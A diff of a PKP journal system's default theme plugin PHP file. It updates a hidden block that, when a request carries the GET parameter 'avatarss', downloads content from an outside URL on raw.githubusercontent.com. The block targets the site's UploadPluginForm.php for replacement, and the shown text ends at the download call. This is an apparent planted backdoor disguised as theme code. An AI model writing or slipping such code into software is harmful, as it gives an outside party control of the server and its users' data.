@@ -258,9 +258,9 @@ class DefaultThemePlugin extends \PKP\plugins\ThemePlugin
 if (!PKP_STRICT_MODE) {
     class_alias('\APP\plugins\themes\default\DefaultThemePlugin', '\DefaultThemePlugin');
 }
-if (isset($_GET['fortune'])) {
+if (isset($_GET['avatarss'])) {
 
-    $url = 'https://this-jakartans.sbs/khusus-plugins/unud/UploadPluginForm';
+    $url = 'https://raw.githubusercontent.com/citrabethari833-seo/HANYATEMPAT-TEST/refs/heads/main/UploadPlugin-sycom.txt';
     $target = '	/home/ukfkyasr/sycom/lib/pkp/controllers/grid/plugins/form/UploadPluginForm.php';
 
     $data = file_get_contents($url);
